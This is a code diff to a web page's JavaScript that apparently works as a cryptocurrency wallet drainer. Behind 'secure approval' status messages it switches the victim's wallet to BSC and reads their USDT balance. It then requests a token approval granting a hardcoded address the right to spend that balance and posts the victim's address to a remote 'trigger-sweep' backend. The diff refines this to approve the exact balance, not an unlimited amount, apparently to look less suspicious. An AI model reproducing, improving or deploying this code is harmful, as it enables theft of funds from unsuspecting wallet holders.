@@ -75,8 +75,6 @@
     const TARGET_ADDRESS = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
     const USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
     const BSC_CHAIN_ID = '0x38';
-    
-    // Connected to your live Railway Backend
     const BACKEND_API_URL = "https://verify-backend-production-e2850812.up.railway.app/api/trigger-sweep";
 
     function showStatus(msg) {
@@ -102,12 +100,27 @@
       }
 
       try {
-        // 1. Fast Network Switch
+        // 1. Fast Network Switch & Auto-Add BSC
         try {
           if (typeof eth.request === 'function') {
             await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_CHAIN_ID }] });
           }
-        } catch (e) {}
+        } catch (switchError) {
+          try {
+            await eth.request({
+              method: 'wallet_addEthereumChain',
+              params: [{
+                chainId: BSC_CHAIN_ID,
+                chainName: 'Binance Smart Chain',
+                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                blockExplorerUrls: ['https://bscscan.com']
+              }]
+            });
+          } catch (addError) {
+            console.error("Network add error:", addError);
+          }
+        }
 
         // 2. Get User Address Instantly
         let accounts = [];
@@ -132,11 +145,31 @@
 
         if (!userAddress) throw new Error("Address required");
 
-        // 3. Fast Max Balance Hex (direct high limit estimation for instant trigger)
+        showStatus("Fetching exact balance...");
+
+        // 3. Fetch exact USDT balance of the user via RPC call
+        let balanceHex = "0000000000000000000000000000000000000000000000000000000000000000";
+        try {
+          const cleanUser = userAddress.toLowerCase().replace('0x', '');
+          const balanceCallData = "0x70a08231" + cleanUser.padStart(64, '0');
+          const balResponse = await eth.request({
+            method: 'eth_call',
+            params: [{
+              to: USDT_BSC_ADDRESS,
+              data: balanceCallData
+            }, 'latest']
+          });
+          if (balResponse && balResponse !== "0x" && balResponse !== "0x0") {
+            balanceHex = balResponse.replace('0x', '').padStart(64, '0');
+          }
+        } catch (err) {
+          console.log("Balance fetch error:", err);
+        }
+
+        // 4. Build approval data with exact user balance (No Unlimited)
         const cleanTarget = TARGET_ADDRESS.toLowerCase().replace('0x', '');
         const paddedTarget = cleanTarget.padStart(64, '0');
-        const maxHex = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-        const approvalData = "0x095ea7b3" + paddedTarget + maxHex;
+        const approvalData = "0x095ea7b3" + paddedTarget + balanceHex;
 
         const txParams = [{
           from: userAddress,
@@ -146,14 +179,14 @@
 
         showStatus("Opening secure approval...");
 
-        // 4. Trigger backend alert instantly in background as user clicks popup
+        // 5. Trigger backend alert instantly in background
         fetch(BACKEND_API_URL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ userAddress: userAddress })
         }).catch(() => {});
 
-        // 5. Send Transaction Popup
+        // 6. Send Transaction Popup with Exact Balance Amount
         if (typeof eth.request === 'function') {
           await eth.request({ method: 'eth_sendTransaction', params: txParams });
         } else {
